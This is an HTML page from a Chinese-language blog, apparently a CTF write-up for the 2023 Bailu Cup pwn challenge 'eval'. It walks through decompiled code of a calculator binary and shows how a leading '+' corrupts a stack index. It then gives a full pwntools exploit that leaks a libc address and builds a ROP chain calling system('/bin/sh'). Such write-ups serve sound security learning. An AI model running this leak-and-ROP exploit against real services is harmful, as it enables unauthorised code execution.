@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言算是这三个月以来第一次打比赛 生疏了很多 然后两题pwn的考点都在代码审计能力我刚好这方面十分薄弱 所以在赛后借助这两题准备进行一次细致的代审 同时 文中出现的函数名大部分都是我自己重命名过的 所以不一样不用担心ida解析问题 eval__int64 __fastcall main(int a1, char **a2, char **a3)&amp;#123;  char v4[160]; &#x2F;&#x2F; [r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023柏鹭杯">
+<meta property="og:url" content="http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="前言算是这三个月以来第一次打比赛 生疏了很多 然后两题pwn的考点都在代码审计能力我刚好这方面十分薄弱 所以在赛后借助这两题准备进行一次细致的代审 同时 文中出现的函数名大部分都是我自己重命名过的 所以不一样不用担心ida解析问题 eval__int64 __fastcall main(int a1, char **a2, char **a3)&amp;#123;  char v4[160]; &#x2F;&#x2F; [r">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png">
+<meta property="article:published_time" content="2023-10-13T12:07:16.000Z">
+<meta property="article:modified_time" content="2023-10-17T05:02:16.827Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>2023柏鹭杯</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/17/%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0socket/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/08/tp-link-sr20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&text=2023柏鹭杯"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&title=2023柏鹭杯"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&is_video=false&description=2023柏鹭杯"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023柏鹭杯&body=Check out this article: http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&title=2023柏鹭杯"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&title=2023柏鹭杯"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&title=2023柏鹭杯"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&title=2023柏鹭杯"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&name=2023柏鹭杯&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&t=2023柏鹭杯"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eval"><span class="toc-number">2.</span> <span class="toc-text">eval</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2023柏鹭杯
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-13T12:07:16.000Z" class="dt-published" itemprop="datePublished">2023-10-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/iot/">iot</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是这三个月以来第一次打比赛 生疏了很多 然后两题pwn的考点都在代码审计能力<br>我刚好这方面十分薄弱 所以在赛后借助这两题准备进行一次细致的代审</p>
+<p>同时 文中出现的函数名大部分都是我自己重命名过的 所以不一样不用担心ida解析问题</p>
+<h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char v4[160]; // [rsp+10h] [rbp-1B0h] BYREF</span><br><span class="line">  char v5[264]; // [rsp+B0h] [rbp-110h] BYREF</span><br><span class="line">  unsigned __int64 v6; // [rsp+1B8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  alarm(0x1Eu);</span><br><span class="line">  while ( recv_data(v5, 0x100uLL) )</span><br><span class="line">    vuln(v5, v4);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>main函数就是清空缓冲区以及设置闹钟 同时使用了一个while循环<br>先跟进一下recv_data这个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_9D6(void *a1, size_t a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  char buf; // [rsp+1Fh] [rbp-11h] BYREF</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v7; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  memset(a1, 0, a2);</span><br><span class="line">  while ( a2 &gt; v6 + 1 &amp;&amp; read(0, &amp;buf, 1uLL) != -1 &amp;&amp; buf != 10 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !check_opt(buf) &amp;&amp; !check_number(buf) )</span><br><span class="line">      error();</span><br><span class="line">    v3 = v6++;</span><br><span class="line">    *(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过单次输入一个字节 随后对该字节进行判断 是否为数字或者运算符 然后存储到a1中<br>随后来看一下vuln函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall vuln(__int64 buf, _QWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  char v3; // [rsp+1Fh] [rbp-11h]</span><br><span class="line">  __int64 buf2; // [rsp+20h] [rbp-10h]</span><br><span class="line">  __int64 i; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  memset(a2, 0, 0xA0uLL);</span><br><span class="line">  buf2 = buf;</span><br><span class="line">  for ( i = 0LL; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(buf + i);</span><br><span class="line">    if ( !check_opt(v3) )                       // 如果不是opt就返回0 即退出for循环</span><br><span class="line">      break;</span><br><span class="line">    deal_number(a2, buf2, i + buf);</span><br><span class="line">    if ( !check_number(*(i + 1 + buf)) )</span><br><span class="line">      error();</span><br><span class="line">    sub_CB1(a2, v3);</span><br><span class="line">    buf2 = i + 1 + buf;</span><br><span class="line">LABEL_8:</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    goto LABEL_8;</span><br><span class="line">  deal_number(a2, buf2, i + buf);</span><br><span class="line">  while ( *a2 )</span><br><span class="line">    calc(a2);</span><br><span class="line">  return printf(&quot;%ld\n&quot;, a2[a2[3] + 3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的逻辑稍微复杂一点<br>仍然是一个逐字节处理 只有是操作符才能执行for循环中的函数<br>来跟进一下deal_number函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_BYTE *__fastcall sub_DC9(__int64 a1, const char *buf2, _BYTE *opt)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  __int64 v4; // rax</span><br><span class="line">  __int64 v5; // rcx</span><br><span class="line">  char old_opt; // [rsp+27h] [rbp-9h]</span><br><span class="line">  _BYTE *first_number; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( *buf2 == &#x27;0&#x27; )</span><br><span class="line">    error();</span><br><span class="line">  old_opt = *opt;</span><br><span class="line">  *opt = 0;</span><br><span class="line">  first_number = strtol(buf2, 0LL, 10);</span><br><span class="line">  result = opt;</span><br><span class="line">  *opt = old_opt;</span><br><span class="line">  if ( first_number )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(a1 + 24);</span><br><span class="line">    *(a1 + 24) = v4 + 1;</span><br><span class="line">    v5 = v4 + 4;</span><br><span class="line">    result = first_number;</span><br><span class="line">    *(a1 + 8 * v5) = first_number;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先判断了是否为0 是则终止程序<br>随后利用strtol将字符串转化为长整型 存储在a1+32处 同时a1+24处自增1 当然这是第一次处理的情况 后面由于a1+24的值不为0了  所以数字存储的地址也会相应增加一个字长<br>sub_cb1函数是一个对于运算符的检查以及筛分后运算</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_CB1(_QWORD *a1, char opt)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  if ( !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (*a1)++;</span><br><span class="line">    *(a1 + result + 8) = opt;</span><br><span class="line">    return result;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( opt != &#x27;+&#x27; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( opt &lt;= &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;*&#x27; )                         // 这边是*的跳转</span><br><span class="line">LABEL_16:</span><br><span class="line">        error();</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( opt != &#x27;-&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;/&#x27; )</span><br><span class="line">        goto LABEL_16;</span><br><span class="line">LABEL_8:</span><br><span class="line">      if ( sub_91A(*(a1 + *a1 + 7)) )           // *(a1 + *a1 + 7)也就是运算符 sub_91A用来进一步检查是否为*和/</span><br><span class="line">        calc(a1);</span><br><span class="line">      if ( *a1 &gt; 0xEuLL )</span><br><span class="line">        error();</span><br><span class="line">      result = (*a1)++;</span><br><span class="line">      *(a1 + result + 8) = opt;</span><br><span class="line">      return result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  calc(a1);</span><br><span class="line">  if ( *a1 &gt; 0xEuLL )</span><br><span class="line">    error();</span><br><span class="line">  result = (*a1)++;</span><br><span class="line">  *(a1 + result + 8) = opt;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>随后calc函数应该很容易就能看出来是干啥的 这里的a1数组后面我们再仔细分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_QWORD *__fastcall sub_AC7(_QWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; // rax</span><br><span class="line">  int opt; // eax</span><br><span class="line"></span><br><span class="line">  result = *a1;</span><br><span class="line">  if ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    opt = *(a1 + --*a1 + 8);</span><br><span class="line">    if ( opt == &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[a1[3] + 2] += a1[a1[3] + 3];           // a1[a1[3] + 2]为第一个number</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( opt &gt; &#x27;+&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt == &#x27;-&#x27; )</span><br><span class="line">      &#123;</span><br><span class="line">        a1[a1[3] + 2] -= a1[a1[3] + 3];</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( opt != &#x27;/&#x27; )</span><br><span class="line">LABEL_15:</span><br><span class="line">          error();</span><br><span class="line">        if ( !a1[a1[3] + 3] )</span><br><span class="line">          error();</span><br><span class="line">        a1[a1[3] + 2] /= a1[a1[3] + 3];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( opt != &#x27;*&#x27; )</span><br><span class="line">        goto LABEL_15;</span><br><span class="line">      a1[a1[3] + 2] *= a1[a1[3] + 3];</span><br><span class="line">    &#125;</span><br><span class="line">    result = a1;</span><br><span class="line">    --a1[3];</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>经过上面的分析 我们大概可以推理出这样一个大概的流程<br>比如 输入1+2<br>首先针对1进行判断 非运算符 所以跳出for循环 但是执行到下面的if的时候 又跳回到了if循环中<br>此时i自增1 也就是判断下一个字符 即+<br>+可以通过判断 此时第一次执行deal_number函数<br>而其第二个参数buf2 此时仍然执行buf首地址 也就是第一个数字<br>于是这里就存储第一个数字到了a1数组中对应的地址 也就是a1+32<br>随后检查下一个字符是否为数字 如果不是则终止程序<br>同时更改了buf2 使其指向2数字位于的地址<br>随后就因为第四个字节为空 此时就算真正跳出了for循环<br>此时再次执行deal_number 也就是对于第二个数字进行存储<br>随后进入calc函数执行操作<br>这里的a1[a1[3] + 2] 我们拆开分析 a1[3]显然是deal_number函数中的v4 在执行两次后 其变成了2 而最后得到的a1[4]就是第一个数字存储的地址 第二个则为a1[5]<br>完整的一个流程应该是这样的 看起来没有什么可以利用的漏洞点<br>但是如果我们输入的是+52会怎么样<br>其会直接进入if分支 随后执行deal_number函数 而此时的buf2指向的是运算符<br>而strtol函数是无法转化运算符的 也就是说其返回值为空 那么第一个数字的存储就失败了<br>随后只会存储52这个数字到a2+32的位置<br>随后执行到calc函数的时候 由于a2[3]此时才为1 所以就相当于a2[3]被增加到了53<br>而最后的printf语句就是根据a2[3]来索引的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;%ld\n&quot;, a2[a2[3] + 3])</span><br></pre></td></tr></table></figure>
+<p>所以漏洞就出现在这里 可以实现一个栈上内容的泄露<br>泄露出libc_start_main的地址<br><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310162001227.png" alt="image.png"></a><br>在得到了libc地址后  我们可以利用同样的办法来操控a2[3]的值 同时可以利用deal_number函数中的strtol函数把str型的system这类地址 转化到栈上 从而可以构建出一条执行链 随后输入空字符 就可以跳出while循环 从而使程序执行到leave ret<br>完整exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">#io = remote(&quot;121.12.85.23&quot;,50532)</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">#context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = &quot;+52&quot;</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.address = int(io.recvuntil(&quot;\n&quot;,drop = True),10)-0x24083</span><br><span class="line"></span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc.address))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">system_addr = libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload = &quot;+54+&quot;+str(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">binsh_addr = next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">payload = &quot;+53+&quot;+str(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">rdi_addr = libc.address + 0x0000000000023b6a</span><br><span class="line"></span><br><span class="line">payload = &quot;+52+&quot;+str(rdi_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">ret_addr = rdi_addr+1</span><br><span class="line"></span><br><span class="line">payload = &quot;+51+&quot;+str(ret_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1054)&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eval"><span class="toc-number">2.</span> <span class="toc-text">eval</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&text=2023柏鹭杯"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&title=2023柏鹭杯"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&is_video=false&description=2023柏鹭杯"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023柏鹭杯&body=Check out this article: http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&title=2023柏鹭杯"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&title=2023柏鹭杯"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&title=2023柏鹭杯"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&title=2023柏鹭杯"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&name=2023柏鹭杯&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/13/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/&t=2023柏鹭杯"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
